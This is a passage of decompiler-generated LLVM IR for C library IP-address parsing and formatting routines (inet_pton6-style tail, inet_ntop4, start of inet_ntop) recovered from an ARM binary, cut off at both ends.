  %v1_16630 = load i32, i32* %r7.global-to-local, align 4
  %v4_16630 = mul i32 %v1_16630, 16
  %v5_16630 = or i32 %v4_16630, %v3_1662c
  store i32 %v5_16630, i32* %r7.global-to-local, align 4
  %v3_16638 = icmp ult i32 %v5_16630, 65534
  br i1 %v3_16638, label %dec_label_pc_166d4, label %dec_label_pc_16790

dec_label_pc_16640:                               ; preds = %dec_label_pc_16610
  %v0_16640 = load i32, i32* @r5, align 4
  %v7_16640 = icmp eq i32 %v0_16640, 58
  br i1 %v7_16640, label %dec_label_pc_16648, label %dec_label_pc_166a4

dec_label_pc_16648:                               ; preds = %dec_label_pc_16640
  %v4_166482 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_166482, i32* %r3.global-to-local, align 4
  %v2_1664c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1664c, label %dec_label_pc_16654, label %dec_label_pc_16668

dec_label_pc_16654:                               ; preds = %dec_label_pc_16648
  %v0_16654 = load i32, i32* %fp.global-to-local, align 4
  %v2_16654 = icmp eq i32 %v0_16654, 0
  br i1 %v2_16654, label %dec_label_pc_1665c, label %dec_label_pc_16790

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16654
  %v0_1665c = load i32, i32* @r4, align 4
  store i32 %v0_1665c, i32* %fp.global-to-local, align 4
  store i32 %v1_16624, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_166dc.backedge

dec_label_pc_16668:                               ; preds = %dec_label_pc_16648
  %v1_16668 = inttoptr i32 %v1_16624 to i8*
  %v2_16668 = load i8, i8* %v1_16668, align 1
  %v3_16668 = zext i8 %v2_16668 to i32
  store i32 %v3_16668, i32* %r3.global-to-local, align 4
  %v2_1666c = icmp eq i8 %v2_16668, 0
  br i1 %v2_1666c, label %dec_label_pc_16790, label %dec_label_pc_16674

dec_label_pc_16674:                               ; preds = %dec_label_pc_16668
  %v0_16674 = load i32, i32* @r4, align 4
  %v1_16674 = add i32 %v0_16674, 2
  store i32 %v1_16674, i32* %r3.global-to-local, align 4
  %v1_16678 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_16674, %v1_16678
  br i1 %tmp38, label %dec_label_pc_16790, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_16674
  %v0_16680 = load i32, i32* %r7.global-to-local, align 4
  %v3_16680 = udiv i32 %v0_16680, 256
  store i32 %v3_16680, i32* %r2.global-to-local, align 4
  store i32 %v0_16674, i32* %r3.global-to-local, align 4
  %v1_16688 = trunc i32 %v3_16680 to i8
  %v3_16688 = inttoptr i32 %v0_16674 to i8*
  store i8 %v1_16688, i8* %v3_16688, align 1
  %v4_16688 = load i32, i32* %r3.global-to-local, align 4
  %v5_16688 = add i32 %v4_16688, 1
  store i32 %v5_16688, i32* %r3.global-to-local, align 4
  %v0_1668c = load i32, i32* @r6, align 4
  store i32 %v0_1668c, i32* %sl.global-to-local, align 4
  %v0_16690 = load i32, i32* %r7.global-to-local, align 4
  %v1_16690 = trunc i32 %v0_16690 to i8
  %v2_16690 = load i32, i32* @r4, align 4
  %v3_16690 = add i32 %v2_16690, 1
  %v4_16690 = inttoptr i32 %v3_16690 to i8*
  store i8 %v1_16690, i8* %v4_16690, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16698 = load i32, i32* %r3.global-to-local, align 4
  %v1_16698 = add i32 %v0_16698, 1
  store i32 %v1_16698, i32* @r4, align 4
  %v0_166dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_166dc.backedge

dec_label_pc_166a4:                               ; preds = %dec_label_pc_16640
  %v7_166a4 = icmp eq i32 %v0_16640, 46
  br i1 %v7_166a4, label %dec_label_pc_166ac, label %dec_label_pc_16790

dec_label_pc_166ac:                               ; preds = %dec_label_pc_166a4
  %v0_166ac = load i32, i32* @r4, align 4
  %v1_166ac = add i32 %v0_166ac, 4
  store i32 %v1_166ac, i32* @r5, align 4
  %v1_166b0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_166ac, %v1_166b0
  br i1 %tmp39, label %dec_label_pc_16790, label %dec_label_pc_166b8

dec_label_pc_166b8:                               ; preds = %dec_label_pc_166ac
  %v0_166bc = load i32, i32* %sl.global-to-local, align 4
  %v1_166bc = inttoptr i32 %v0_166bc to i8*
  store i32 %v0_166bc, i32* %r0.global-to-local, align 4
  %v4_166c0 = call i32 @inet_pton4(i8* %v1_166bc, i32 %v0_166ac)
  store i32 %v4_166c0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_166c0, 1
  br i1 %tmp36, label %dec_label_pc_16790, label %bb

bb:                                               ; preds = %dec_label_pc_166b8
  %v5_166c8 = load i32, i32* @r5, align 4
  store i32 %v5_166c8, i32* @r4, align 4
  br label %dec_label_pc_16718

dec_label_pc_166d4:                               ; preds = %dec_label_pc_1662c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166dc.backedge

dec_label_pc_166dc.backedge:                      ; preds = %dec_label_pc_166d4, %dec_label_pc_1665c, %dec_label_pc_16680
  %v0_166dc = phi i32 [ %v1_16624, %dec_label_pc_1665c ], [ %v0_166dc.pre, %dec_label_pc_16680 ], [ %v1_16624, %dec_label_pc_166d4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1665c ], [ 0, %dec_label_pc_16680 ], [ 1, %dec_label_pc_166d4 ]
  %v1_166dc = inttoptr i32 %v0_166dc to i8*
  %v2_166dc = load i8, i8* %v1_166dc, align 1
  %v3_166dc = zext i8 %v2_166dc to i32
  store i32 %v3_166dc, i32* %r0.global-to-local, align 4
  %v1_166e0 = call i32 @__GI_tolower(i32 %v3_166dc)
  store i32 %v1_166e0, i32* %r0.global-to-local, align 4
  store i32 %v1_166e0, i32* @r5, align 4
  %v2_166e4 = icmp eq i32 %v1_166e0, 0
  br i1 %v2_166e4, label %dec_label_pc_166ec, label %dec_label_pc_16610

dec_label_pc_166ec:                               ; preds = %dec_label_pc_166dc.backedge, %dec_label_pc_165fc
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_165fc ], [ %stack_var_-56.0.be, %dec_label_pc_166dc.backedge ]
  %v4_166ec3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_166ec3, i32* %r3.global-to-local, align 4
  %v2_166f0 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1675c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_166f0, label %dec_label_pc_16718, label %dec_label_pc_166f8

dec_label_pc_166f8:                               ; preds = %dec_label_pc_166ec
  %v1_166f8 = add i32 %v0_1675c.pre.pre, 2
  store i32 %v1_166f8, i32* %r3.global-to-local, align 4
  %v1_166fc = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_166f8, %v1_166fc
  br i1 %tmp40, label %dec_label_pc_16790, label %dec_label_pc_16704

dec_label_pc_16704:                               ; preds = %dec_label_pc_166f8
  store i32 %v0_1675c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_16708 = load i32, i32* %r7.global-to-local, align 4
  %v3_16708 = udiv i32 %v0_16708, 256
  store i32 %v3_16708, i32* %r2.global-to-local, align 4
  %v1_1670c = trunc i32 %v3_16708 to i8
  %v3_1670c = inttoptr i32 %v0_1675c.pre.pre to i8*
  store i8 %v1_1670c, i8* %v3_1670c, align 1
  %v4_1670c = load i32, i32* %r3.global-to-local, align 4
  %v5_1670c = add i32 %v4_1670c, 1
  store i32 %v5_1670c, i32* %r3.global-to-local, align 4
  %v0_16710 = load i32, i32* %r7.global-to-local, align 4
  %v1_16710 = trunc i32 %v0_16710 to i8
  %v2_16710 = load i32, i32* @r4, align 4
  %v3_16710 = add i32 %v2_16710, 1
  %v4_16710 = inttoptr i32 %v3_16710 to i8*
  store i8 %v1_16710, i8* %v4_16710, align 1
  %v0_16714 = load i32, i32* %r3.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 1
  store i32 %v1_16714, i32* @r4, align 4
  br label %dec_label_pc_16718

dec_label_pc_16718:                               ; preds = %dec_label_pc_166ec, %bb, %dec_label_pc_16704
  %v0_1675c.pre = phi i32 [ %v5_166c8, %bb ], [ %v1_16714, %dec_label_pc_16704 ], [ %v0_1675c.pre.pre, %dec_label_pc_166ec ]
  %v0_16718 = load i32, i32* %fp.global-to-local, align 4
  %v2_16718 = icmp eq i32 %v0_16718, 0
  %v1_1675c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_16718, label %dec_label_pc_1675c, label %dec_label_pc_16720

dec_label_pc_16720:                               ; preds = %dec_label_pc_16718
  %v9_16720 = icmp eq i32 %v0_1675c.pre, %v1_1675c.pre
  %v2_16724 = sub i32 %v0_1675c.pre, %v0_16718
  store i32 %v2_16724, i32* %r0.global-to-local, align 4
  br i1 %v9_16720, label %dec_label_pc_16790, label %dec_label_pc_16744.preheader

dec_label_pc_16744.preheader:                     ; preds = %dec_label_pc_16720
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16744

dec_label_pc_16734:                               ; preds = %dec_label_pc_16744
  %v0_16734 = load i32, i32* %fp.global-to-local, align 4
  %v2_16734 = add i32 %v0_16734, %v2_16748
  %v3_16734 = inttoptr i32 %v2_16734 to i8*
  %v4_16734 = load i8, i8* %v3_16734, align 1
  %v3_16738 = inttoptr i32 %v2_1674c to i8*
  store i8 %v4_16734, i8* %v3_16738, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16740 = load i32, i32* %fp.global-to-local, align 4
  %v3_16740 = load i32, i32* @ip, align 4
  %v4_16740 = add i32 %v3_16740, %v2_16740
  %v5_16740 = inttoptr i32 %v4_16740 to i8*
  store i8 0, i8* %v5_16740, align 1
  %v0_16744.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16744.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1674c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16744

dec_label_pc_16744:                               ; preds = %dec_label_pc_16744.preheader, %dec_label_pc_16734
  %v0_16758 = phi i32 [ %v1_1675c.pre, %dec_label_pc_16744.preheader ], [ %v1_1674c.pre, %dec_label_pc_16734 ]
  %v1_16748 = phi i32 [ %v2_16724, %dec_label_pc_16744.preheader ], [ %v1_16744.pre, %dec_label_pc_16734 ]
  %v0_16750 = phi i32 [ 1, %dec_label_pc_16744.preheader ], [ %v0_16744.pre, %dec_label_pc_16734 ]
  %v2_16748 = sub i32 %v1_16748, %v0_16750
  store i32 %v2_16748, i32* @ip, align 4
  %v2_1674c = sub i32 %v0_16758, %v0_16750
  store i32 %v2_1674c, i32* @lr, align 4
  %v1_16750 = add i32 %v0_16750, 1
  store i32 %v1_16750, i32* %r2.global-to-local, align 4
  %v7_16754 = icmp slt i32 %v1_16748, %v0_16750
  br i1 %v7_16754, label %dec_label_pc_16758, label %dec_label_pc_16734

dec_label_pc_16758:                               ; preds = %dec_label_pc_16744
  store i32 %v0_16758, i32* @r4, align 4
  br label %dec_label_pc_1675c

dec_label_pc_1675c:                               ; preds = %dec_label_pc_16718, %dec_label_pc_16758
  %v0_1675c = phi i32 [ %v0_16758, %dec_label_pc_16758 ], [ %v0_1675c.pre, %dec_label_pc_16718 ]
  %v1_1675c = phi i32 [ %v0_16758, %dec_label_pc_16758 ], [ %v1_1675c.pre, %dec_label_pc_16718 ]
  %v9_1675c = icmp eq i32 %v0_1675c, %v1_1675c
  br i1 %v9_1675c, label %dec_label_pc_16764, label %dec_label_pc_16790

dec_label_pc_16764:                               ; preds = %dec_label_pc_1675c
  store i32 16, i32* @r2, align 4
  %v2_16768 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_16768, i32* @r0, align 4
  store i32 %v2_165cc, i32* @r1, align 4
  %v0_16770 = call i32 @memcpy()
  store i32 %v0_16770, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16794

dec_label_pc_1677c:                               ; preds = %dec_label_pc_165ac
  %v0_1677c = call i32 @__errno_location()
  store i32 %v0_1677c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16788 = inttoptr i32 %v0_1677c to i32*
  store i32 97, i32* %v2_16788, align 4
  %v0_16794.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16794

dec_label_pc_16790:                               ; preds = %dec_label_pc_1662c, %dec_label_pc_16654, %dec_label_pc_16674, %dec_label_pc_16668, %dec_label_pc_166b8, %dec_label_pc_16720, %dec_label_pc_166a4, %dec_label_pc_1675c, %dec_label_pc_165f0, %dec_label_pc_166ac, %dec_label_pc_166f8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16794

dec_label_pc_16794:                               ; preds = %dec_label_pc_165b8, %dec_label_pc_1677c, %dec_label_pc_16764, %dec_label_pc_16790
  %v0_16794 = phi i32 [ %v4_165c0, %dec_label_pc_165b8 ], [ %v0_16794.pre, %dec_label_pc_1677c ], [ 1, %dec_label_pc_16764 ], [ 0, %dec_label_pc_16790 ]
  store i32 %v0_16794, i32* %r0.global-to-local, align 4
  store i32 %v3_16594, i32* @r4, align 4
  store i32 %v6_16594, i32* @r5, align 4
  store i32 %v9_16594, i32* @r6, align 4
  ret i32 %v0_16794

; uselistorder directives
  uselistorder i32 %v0_16794, { 1, 0 }
  uselistorder i32 %v2_1674c, { 1, 0 }
  uselistorder i32 %v2_16748, { 1, 0 }
  uselistorder i32 %v0_16750, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16758, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1675c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1675c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_16708, { 1, 0 }
  uselistorder i32 %v0_1675c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_166e0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_166bc, { 1, 0 }
  uselistorder i32 %v3_16680, { 1, 0 }
  uselistorder i32 %v0_16674, { 1, 0, 2 }
  uselistorder i32 %v1_16624, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1661c, { 1, 0 }
  uselistorder i32 %v0_16600, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 3, 1, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 5, 6, 0, 2, 3, 1, 4, 7 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 15, 16, 14, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 8, 7, 9, 10, 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 12, 15, 13, 14, 6, 5, 17, 16, 4, 3, 2, 1, 8, 7, 10, 9, 0 }
  uselistorder i32* %fp.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i8 1, { 5, 1, 4, 7, 2, 3, 8, 6, 0, 9, 10, 11, 12 }
  uselistorder i32 58, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 (i8*, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_16794, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_16790, { 7, 5, 10, 4, 9, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1675c, { 1, 0 }
  uselistorder label %dec_label_pc_16744, { 1, 0 }
  uselistorder label %dec_label_pc_16718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166dc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16610, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_167a4 = load i32, i32* @r4, align 4
  store i32 %v3_167a4, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1b098.922 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_167c0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_167c0, i32* @r0, align 4
  %v0_167c4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_167d4 = bitcast i32* %stack_var_-51 to i8*
  %v3_167d4 = call i32 @__GI_memset(i8* %v2_167d4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1689c = ptrtoint i32* %stack_var_-36 to i32
  %v2_16878 = add i32 %v2_1689c, -17
  br label %dec_label_pc_1689c

dec_label_pc_167e4:                               ; preds = %dec_label_pc_1689c
  %v0_167e4 = load i32, i32* %fp.global-to-local, align 4
  %v2_167e4 = add i32 %v0_167e4, %v1_167e4
  %v3_167e4 = inttoptr i32 %v2_167e4 to i8*
  %v4_167e4 = load i8, i8* %v3_167e4, align 1
  %v6_167e4 = zext i8 %v4_167e4 to i32
  store i32 %v6_167e4, i32* %r4.global-to-local, align 4
  %v1_167e8 = add i32 %v0_167e8, 1
  store i32 %v1_167e8, i32* %r7.global-to-local, align 4
  store i32 %v2_1689c, i32* %r2.global-to-local, align 4
  %v2_167f4 = add i32 %v1_167e8, %v2_1689c
  store i32 %v2_167f4, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_167e4, 100
  %v1_167fc = or i8 %div, 48
  %v3_16800 = add i32 %v2_168ac, -17
  %v4_16800 = inttoptr i32 %v3_16800 to i8*
  store i8 %v1_167fc, i8* %v4_16800, align 1
  %v0_16804 = load i32, i32* %r5.global-to-local, align 4
  %v1_16804 = add i32 %v0_16804, -17
  %v2_16804 = inttoptr i32 %v1_16804 to i8*
  %v3_16804 = load i8, i8* %v2_16804, align 1
  %v7_16808 = icmp eq i8 %v3_16804, 48
  %v0_1680c = load i32, i32* %fp.global-to-local, align 4
  %v1_1680c = load i32, i32* %r8.global-to-local, align 4
  %v2_1680c = add i32 %v1_1680c, %v0_1680c
  store i32 %v2_1680c, i32* %sb.global-to-local, align 4
  %v0_16814 = load i32, i32* %r4.global-to-local, align 4
  %v2_1681c = udiv i32 %v0_16814, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16824 = urem i32 %v2_1681c, 256
  %v2_16828 = urem i32 %v1_16824, 10
  %v1_1682c = or i32 %v2_16828, 48
  %v1_16830 = trunc i32 %v1_1682c to i8
  br i1 %v7_16808, label %dec_label_pc_1681c, label %dec_label_pc_16844

dec_label_pc_1681c:                               ; preds = %dec_label_pc_167e4
  store i8 %v1_16830, i8* %v2_16804, align 1
  %v0_16834 = load i32, i32* %r5.global-to-local, align 4
  %v1_16834 = add i32 %v0_16834, -17
  %v2_16834 = inttoptr i32 %v1_16834 to i8*
  %v3_16834 = load i8, i8* %v2_16834, align 1
  %v7_16838 = icmp eq i8 %v3_16834, 48
  br i1 %v7_16838, label %dec_label_pc_1681c.dec_label_pc_16868_crit_edge, label %bb

dec_label_pc_1681c.dec_label_pc_16868_crit_edge:  ; preds = %dec_label_pc_1681c
  %v1_16878.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16868

bb:                                               ; preds = %dec_label_pc_1681c
  %v1_1683c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1683c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16844:                               ; preds = %dec_label_pc_167e4
  %v2_16860 = load i32, i32* %sl.global-to-local, align 4
  %v3_16860 = add i32 %v2_16860, -17
  %v4_16860 = inttoptr i32 %v3_16860 to i8*
  store i8 %v1_16830, i8* %v4_16860, align 1
  %v0_16864 = load i32, i32* %r7.global-to-local, align 4
  %v1_16864 = add i32 %v0_16864, 1
  store i32 %v1_16864, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16868:                               ; preds = %dec_label_pc_1681c.dec_label_pc_16868_crit_edge, %bb, %dec_label_pc_16844
  %v1_16878 = phi i32 [ %v1_16878.pre, %dec_label_pc_1681c.dec_label_pc_16868_crit_edge ], [ %v1_1683c, %bb ], [ %v1_16864, %dec_label_pc_16844 ]
  %v0_16868 = load i32, i32* %sb.global-to-local, align 4
  %v1_16868 = inttoptr i32 %v0_16868 to i8*
  %v2_16868 = load i8, i8* %v1_16868, align 1
  %tmp17 = urem i8 %v2_16868, 10
  store i32 %v2_1689c, i32* %ip.global-to-local, align 4
  %v1_1687c = add i32 %v1_16878, 1
  store i32 %v1_1687c, i32* %r1.global-to-local, align 4
  %v1_16880 = or i8 %tmp17, 48
  %v3_16884 = add i32 %v2_16878, %v1_16878
  %v4_16884 = inttoptr i32 %v3_16884 to i8*
  store i8 %v1_16880, i8* %v4_16884, align 1
  %v0_16888 = load i32, i32* %ip.global-to-local, align 4
  %v1_16888 = load i32, i32* %r1.global-to-local, align 4
  %v2_16888 = add i32 %v1_16888, %v0_16888
  store i32 %v2_16888, i32* %r2.global-to-local, align 4
  %v3_16890 = add i32 %v2_16888, -17
  %v4_16890 = inttoptr i32 %v3_16890 to i8*
  store i8 46, i8* %v4_16890, align 1
  %v0_16894 = load i32, i32* %r8.global-to-local, align 4
  %v1_16894 = add i32 %v0_16894, 1
  store i32 %v1_16894, i32* %r8.global-to-local, align 4
  %v0_16898 = load i32, i32* %r1.global-to-local, align 4
  %v1_16898 = add i32 %v0_16898, 1
  br label %dec_label_pc_1689c

dec_label_pc_1689c:                               ; preds = %entry, %dec_label_pc_16868
  %v0_167e8 = phi i32 [ 0, %entry ], [ %v1_16898, %dec_label_pc_16868 ]
  %v1_167e4 = phi i32 [ 0, %entry ], [ %v1_16894, %dec_label_pc_16868 ]
  store i32 %v2_1689c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_167e8, i32* %r6.global-to-local, align 4
  %v2_168ac = add i32 %v0_167e8, %v2_1689c
  store i32 %v2_168ac, i32* %r5.global-to-local, align 4
  %v7_168b0 = icmp sgt i32 %v1_167e4, 3
  br i1 %v7_168b0, label %dec_label_pc_168b4, label %dec_label_pc_167e4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_1689c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_167c0, i32* %r4.global-to-local, align 4
  %v3_168bc = add i32 %v2_168ac, -18
  %v4_168bc = inttoptr i32 %v3_168bc to i8*
  store i8 0, i8* %v4_168bc, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_168c4 = call i32 @strlen(i8* %tmp18)
  %v2_168c8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_168c4, %v2_168c8
  br i1 %tmp, label %dec_label_pc_168d4, label %dec_label_pc_168e8

dec_label_pc_168d4:                               ; preds = %dec_label_pc_168b4
  %v0_168d4 = call i32 @__errno_location()
  %v0_168dc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_168dc, i32* %r2.global-to-local, align 4
  %v2_168e0 = inttoptr i32 %v0_168d4 to i32*
  store i32 28, i32* %v2_168e0, align 4
  %v0_168f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_168f8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168b4
  store i32 %v2_167c0, i32* %r1.global-to-local, align 4
  %v3_168f0 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_168f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168d4, %dec_label_pc_168e8
  %v0_168f8 = phi i32 [ %v0_168f8.pre, %dec_label_pc_168d4 ], [ %v3_168f0, %dec_label_pc_168e8 ]
  %v2_16900 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16900, i32* @r4, align 4
  ret i32 %v0_168f8

; uselistorder directives
  uselistorder i32 %v2_168ac, { 0, 2, 1 }
  uselistorder i32 %v1_167e4, { 1, 0 }
  uselistorder i32 %v0_167e8, { 0, 2, 1 }
  uselistorder i32 %v2_1689c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_168f8, { 1, 0 }
  uselistorder label %dec_label_pc_1689c, { 1, 0 }
  uselistorder label %dec_label_pc_16868, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16908 = load i32, i32* @r4, align 4
  store i32 %v3_16908, i32* %stack_var_-32, align 4
  %v6_16908 = load i32, i32* @r5, align 4
  %v25_16908 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1690c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1690c, label %dec_label_pc_16930, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %entry
  %v7_16924 = icmp eq i32 %arg1, 10
  br i1 %v7_16924, label %dec_label_pc_16944, label %dec_label_pc_16b44

dec_label_pc_16930:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1693c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_16b3c

dec_label_pc_16944:                               ; preds = %dec_label_pc_16924
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_16950 = bitcast i32* %stack_var_-64 to i8*
  %v3_16950 = call i32 @__GI_memset(i8* %v2_16950, i32 0)
  br label %dec_label_pc_16970

dec_label_pc_1695c:                               ; preds = %dec_label_pc_16970
  %tmp68 = icmp slt i32 %v1_16960, 0
  %v4_16970 = zext i1 %tmp68 to i32
  %v5_16970 = add i32 %v4_16970, %v1_16960
  %v3_16974 = sdiv i32 %v5_16970, 2
  %v4_16984 = mul i32 %v3_16974, 4
  %v5_16984 = add i32 %v4_16984, %v25_16908
  %v1_1695c = add i32 %v2_16980, 1
  %v2_1695c = inttoptr i32 %v1_1695c to i8*
  %v3_1695c = load i8, i8* %v2_1695c, align 1
  %v4_1695c = zext i8 %v3_1695c to i32
  %v3_16960 = inttoptr i32 %v2_16980 to i8*
  %v4_16960 = load i8, i8* %v3_16960, align 1
  %v6_16960 = zext i8 %v4_16960 to i32
  store i32 %v6_16960, i32* %r2.global-to-local, align 4
  %v4_16964 = mul nuw nsw i32 %v6_16960, 256
  %v5_16964 = or i32 %v4_16964, %v4_1695c
  %v2_16968 = add i32 %v5_16984, -32
  %v3_16968 = inttoptr i32 %v2_16968 to i32*
  store i32 %v5_16964, i32* %v3_16968, align 4
  %v0_1696c = load i32, i32* %r1.global-to-local, align 4
  %v1_1696c = add i32 %v0_1696c, 2
  br label %dec_label_pc_16970

dec_label_pc_16970:                               ; preds = %dec_label_pc_16944, %dec_label_pc_1695c
  %v1_16960 = phi i32 [ 0, %dec_label_pc_16944 ], [ %v1_1696c, %dec_label_pc_1695c ]
  store i32 %v1_16960, i32* %r1.global-to-local, align 4
  %v0_16980 = load i32, i32* @r8, align 4
  %v2_16980 = add i32 %v0_16980, %v1_16960
  store i32 %v2_16980, i32* %r2.global-to-local, align 4
  %v7_16988 = icmp sgt i32 %v1_16960, 15
  br i1 %v7_16988, label %dec_label_pc_1698c, label %dec_label_pc_1695c

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16970
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %dec_label_pc_1698c, %dec_label_pc_169e8
